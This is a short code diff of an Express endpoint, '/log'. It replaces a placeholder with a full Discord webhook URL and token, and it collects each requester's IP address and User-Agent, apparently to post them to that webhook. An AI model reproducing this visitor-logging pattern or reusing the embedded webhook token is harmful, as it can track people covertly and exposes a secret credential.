@@ -11,7 +11,7 @@ app.post('/log', (req, res) => {
   const userAgent = req.headers['user-agent'];
 
   // Customize the Discord webhook URL based on your preferences
-  const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+  const webhookUrl = 'https://discord.com/api/webhooks/1201943878429577257/o1yNW-9fnWcP2SiwxIqjRZn3cW80V-rp6fAAyUw9F891i_QfkmApoY4PGdPm4ugE-kID';
 
   const message = `IP: ${ip}\nUser-Agent: ${userAgent}`;
 
